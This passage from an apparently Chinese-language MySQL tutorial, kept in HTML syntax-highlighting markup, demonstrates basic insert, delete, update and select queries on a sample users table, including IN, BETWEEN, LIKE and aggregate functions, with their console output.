punctuation\">)</span>va</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>lues<span class=\"token punctuation\">(</span><span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"admin123\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">112233</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"31166@qq.com\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>增加两条</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">insert</span> <span class=\"token keyword\">into</span> users<span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">,</span>password<span class=\"token punctuation\">,</span>qq<span class=\"token punctuation\">,</span>email<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">values</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"root\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"root\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1133333</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"30099@qq.com\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"gyar\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"adminroot\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">878787</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"admin@qwe.com\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>删除</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">delete</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">where</span>条件 id<span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>不添加<span class=\"token keyword\">where</span>语句代表全部删除</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>更改</pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">update</span> users <span class=\"token keyword\">set</span> password<span class=\"token operator\">=</span><span class=\"token string\">\"admin321\"</span><span class=\"token keyword\">where</span> id<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>更改多个</pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">update</span> users <span class=\"token keyword\">set</span> password<span class=\"token operator\">=</span><span class=\"token string\">\"admin321\"</span><span class=\"token punctuation\">,</span>qq<span class=\"token operator\">=</span><span class=\"token string\">\"75757575\"</span><span class=\"token keyword\">where</span> id<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>查询</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>查询所有</pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>查询指定</pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">select</span> password<span class=\"token punctuation\">,</span>qq <span class=\"token keyword\">from</span> users<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>查询id<span class=\"token operator\">=</span><span class=\"token number\">1</span>的password<span class=\"token punctuation\">,</span>qq</pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">select</span> password<span class=\"token punctuation\">,</span>qq <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> id<span class=\"token operator\">=</span><span class=\"token number\">3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">select</span> password<span class=\"token punctuation\">,</span>qq <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> id<span class=\"token operator\">></span><span class=\"token number\">3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">select</span> password<span class=\"token punctuation\">,</span>qq <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> id<span class=\"token operator\">&lt;</span><span class=\"token number\">3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token operator\">in</span>查询</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>查询id<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>mysql<span class=\"token operator\">></span><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> id <span class=\"token operator\">in</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+-----------+----------+---------------+</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token operator\">|</span> id <span class=\"token operator\">|</span> username <span class=\"token operator\">|</span> password  <span class=\"token operator\">|</span> qq       <span class=\"token operator\">|</span> email         <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+-----------+----------+---------------+</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">2</span> <span class=\"token operator\">|</span> admin    <span class=\"token operator\">|</span> admin321  <span class=\"token operator\">|</span>  <span class=\"token number\">75757575</span> <span class=\"token operator\">|</span> <span class=\"token number\">31166</span><span class=\"token variable\">@qq.com</span>  <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">4</span> <span class=\"token operator\">|</span> gyar     <span class=\"token operator\">|</span> adminroot <span class=\"token operator\">|</span>   <span class=\"token number\">878787</span> <span class=\"token operator\">|</span> admin<span class=\"token variable\">@qwe.com</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">5</span> <span class=\"token operator\">|</span> adminer  <span class=\"token operator\">|</span> <span class=\"token number\">443322114</span>  <span class=\"token operator\">|</span> <span class=\"token number\">21987321</span> <span class=\"token operator\">|</span> <span class=\"token number\">123408</span><span class=\"token variable\">@ad.com</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+-----------+----------+---------------+</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token operator\">between</span>查询</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>查询<span class=\"token number\">2</span>到<span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>mysql<span class=\"token operator\">></span><span class=\"token keyword\">select</span> password<span class=\"token punctuation\">,</span>qq <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> id <span class=\"token operator\">between</span> <span class=\"token number\">2</span> <span class=\"token operator\">and</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">-----------+---------+</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token operator\">|</span> password  <span class=\"token operator\">|</span> qq      <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">-----------+---------+</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token operator\">|</span> admin321  <span class=\"token operator\">|</span> <span class=\"token number\">75757575</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token operator\">|</span> root      <span class=\"token operator\">|</span> <span class=\"token number\">1133333</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token operator\">|</span> adminroot <span class=\"token operator\">|</span>  <span class=\"token number\">878787</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">-----------+---------+</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>不查询<span class=\"token number\">1</span>到<span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> password<span class=\"token punctuation\">,</span>qq <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> id <span class=\"token operator\">not</span> <span class=\"token operator\">between</span> <span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">-----------+----------+</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token operator\">|</span> password  <span class=\"token operator\">|</span> qq       <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">-----------+----------+</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token operator\">|</span> adminroot <span class=\"token operator\">|</span>   <span class=\"token number\">878787</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">443322114</span>  <span class=\"token operator\">|</span> <span class=\"token number\">21987321</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">-----------+----------+</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token operator\">like</span>查询</pre></td></tr><tr><td data-num=\"59\"></td><td><pre>查询username字段里带m的</pre></td></tr><tr><td data-num=\"60\"></td><td><pre>mysql<span class=\"token operator\">></span><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> username <span class=\"token operator\">like</span> <span class=\"token string\">\"%m%\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+----------+----------+---------------+</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token operator\">|</span> id <span class=\"token operator\">|</span> username <span class=\"token operator\">|</span> password <span class=\"token operator\">|</span> qq       <span class=\"token operator\">|</span> email         <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+----------+----------+---------------+</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">2</span> <span class=\"token operator\">|</span> admin    <span class=\"token operator\">|</span> admin321 <span class=\"token operator\">|</span>  <span class=\"token number\">75757575</span> <span class=\"token operator\">|</span> <span class=\"token number\">31166</span><span class=\"token variable\">@qq.com</span>  <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">5</span> <span class=\"token operator\">|</span> adminer  <span class=\"token operator\">|</span> <span class=\"token number\">443322114</span> <span class=\"token operator\">|</span> <span class=\"token number\">21987321</span> <span class=\"token operator\">|</span> <span class=\"token number\">123408</span><span class=\"token variable\">@ad.com</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+----------+----------+---------------+</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>查询email字段里带we的</pre></td></tr><tr><td data-num=\"68\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> email <span class=\"token operator\">like</span> <span class=\"token string\">\"%we%\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+-----------+--------+---------------+</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token operator\">|</span> id <span class=\"token operator\">|</span> username <span class=\"token operator\">|</span> password  <span class=\"token operator\">|</span> qq     <span class=\"token operator\">|</span> email         <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+-----------+--------+---------------+</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">4</span> <span class=\"token operator\">|</span> gyar     <span class=\"token operator\">|</span> adminroot <span class=\"token operator\">|</span> <span class=\"token number\">878787</span> <span class=\"token operator\">|</span> admin<span class=\"token variable\">@qwe.com</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+-----------+--------+---------------+</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>下划线 _ 匹配一个字符 </pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token keyword\">select</span><span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> username <span class=\"token operator\">like</span> <span class=\"token string\">\"admi_\"</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> username <span class=\"token operator\">like</span> <span class=\"token string\">\"admi_\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+----------+---------+--------------+</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre><span class=\"token operator\">|</span> id <span class=\"token operator\">|</span> username <span class=\"token operator\">|</span> password <span class=\"token operator\">|</span> qq      <span class=\"token operator\">|</span> email        <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+----------+---------+--------------+</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">2</span> <span class=\"token operator\">|</span> admin    <span class=\"token operator\">|</span> admin321 <span class=\"token operator\">|</span> <span class=\"token number\">75757575</span> <span class=\"token operator\">|</span> <span class=\"token number\">31166</span><span class=\"token variable\">@qq.com</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+----------+---------+--------------+</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>充当下一个字符</pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>满足多个条件 <span class=\"token operator\">and</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> id<span class=\"token operator\">=</span><span class=\"token number\">3</span> <span class=\"token operator\">and</span> password<span class=\"token operator\">=</span><span class=\"token string\">\"root\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+----------+---------+--------------+</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre><span class=\"token operator\">|</span> id <span class=\"token operator\">|</span> username <span class=\"token operator\">|</span> password <span class=\"token operator\">|</span> qq      <span class=\"token operator\">|</span> email        <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+----------+---------+--------------+</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">3</span> <span class=\"token operator\">|</span> root     <span class=\"token operator\">|</span> root     <span class=\"token operator\">|</span> <span class=\"token number\">1133333</span> <span class=\"token operator\">|</span> <span class=\"token number\">30099</span><span class=\"token variable\">@qq.com</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+----------+---------+--------------+</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>满足任意一个条件 <span class=\"token operator\">or</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> id<span class=\"token operator\">=</span><span class=\"token number\">3</span> <span class=\"token operator\">or</span> password<span class=\"token operator\">=</span><span class=\"token string\">\"roo\"</span>；</pre></td></tr><tr><td data-num=\"96\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+----------+---------+--------------+</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre><span class=\"token operator\">|</span> id <span class=\"token operator\">|</span> username <span class=\"token operator\">|</span> password <span class=\"token operator\">|</span> qq      <span class=\"token operator\">|</span> email        <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+----------+---------+--------------+</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">3</span> <span class=\"token operator\">|</span> root     <span class=\"token operator\">|</span> root     <span class=\"token operator\">|</span> <span class=\"token number\">1133333</span> <span class=\"token operator\">|</span> <span class=\"token number\">30099</span><span class=\"token variable\">@qq.com</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----+----------+----------+---------+--------------+</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre><span class=\"token number\">1</span> <span class=\"token keyword\">row</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>聚合查询</pre></td></tr><tr><td data-num=\"104\"></td><td><pre>聚合函数包括 <span class=\"token function\">COUNT</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>，<span class=\"token function\">SUM</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>，<span class=\"token function\">AVG</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>，<span class=\"token function\">MAX</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 和 <span class=\"token function\">MIN</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>。其中，<span class=\"token function\">COUNT</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 用来统计</pre></td></tr><tr><td data-num=\"105\"></td><td><pre>录的条数；<span class=\"token function\">SUM</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 用来计算字段值的总和；<span class=\"token function\">AVG</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 用</pre></td></tr><tr><td data-num=\"106\"></td><td><pre>来计算字段值的平均值；<span class=\"token function\">MAX</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 用来查询字段的最大值；<span class=\"token function\">MIN</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 用来查询字段的最小值。</pre></td></tr><tr><td data-num=\"107\"></td><td><pre>count 返回行数</pre></td></tr><tr><td data-num=\"108\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> users<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----------+</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----------+</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre><span class=\"token operator\">|</span>        <span class=\"token number\">4</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----------+</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre><span class=\"token number\">1</span> <span class=\"token keyword\">row</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> users<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">-----------+</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">-----------+</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre><span class=\"token operator\">|</span>         <span class=\"token number\">4</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">-----------+</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre><span class=\"token number\">1</span> <span class=\"token keyword\">row</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>sum返回某列的和</pre></td></tr><tr><td data-num=\"125\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> <span class=\"token function\">sum</span><span class=\"token punctuation\">(</span>qq<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> users<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----------+</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token function\">sum</span><span class=\"token punctuation\">(</span>qq<span class=\"token punctuation\">)</span>  <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----------+</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">26004269</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----------+</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre><span class=\"token number\">1</span> <span class=\"token keyword\">row</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>avg返回某列平均值</pre></td></tr><tr><td data-num=\"134\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> <span class=\"token function\">avg</span><span class=\"token punctuation\">(</span>qq<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> users<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">--------------+</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token function\">avg</span><span class=\"token punctuation\">(</span>qq<span class=\"token punctuation\">)</span>      <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">--------------+</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">6501067.2500</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">--------------+</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre><span class=\"token number\">1</span> <span class=\"token keyword\">row</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>max返回最大值</pre></td></tr><tr><td data-num=\"143\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> <span class=\"token function\">max</span><span class=\"token punctuation\">(</span>qq<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> users<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----------+</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token function\">max</span><span class=\"token punctuation\">(</span>qq<span class=\"token punctuation\">)</span>  <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----------+</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">21987321</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----------+</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre><span class=\"token number\">1</span> <span class=\"token keyword\">row</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre></pre></td></tr><tr><td data-num=\"151\"></td><td><pre></pre></td></tr><tr><td data-num=\"152\"></td><td><pre></pre></td></tr><tr><td data-num=\"153\"></td><td><pre><span class=\"token function\">MIN</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 返回某列的最小值</pre></td></tr><tr><td data-num=\"154\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> <span class=\"token function\">min</span><span class=\"token punctuation\">(</span>qq<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> users<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">---------+</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token function\">min</span><span class=\"token punctuation\">(</span>qq<span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">---------+</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre><span class=\"token operator\">|</span>  <span class=\"token number\">878787</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">---------+</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre><span class=\"token number\">1</span> <span class=\"token keyword\">row</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre></pre></td></tr><tr><td data-num=\"162\"></td><td><pre> <span class=\"token keyword\">GROUP</span> <span class=\"token keyword\">BY</span>单独使用</pre></td></tr><tr><td data-num=\"163\"></td><td><pre>单独使用 <span class=\"token keyword\">GROUP</span> <span class=\"token keyword\">BY</span> 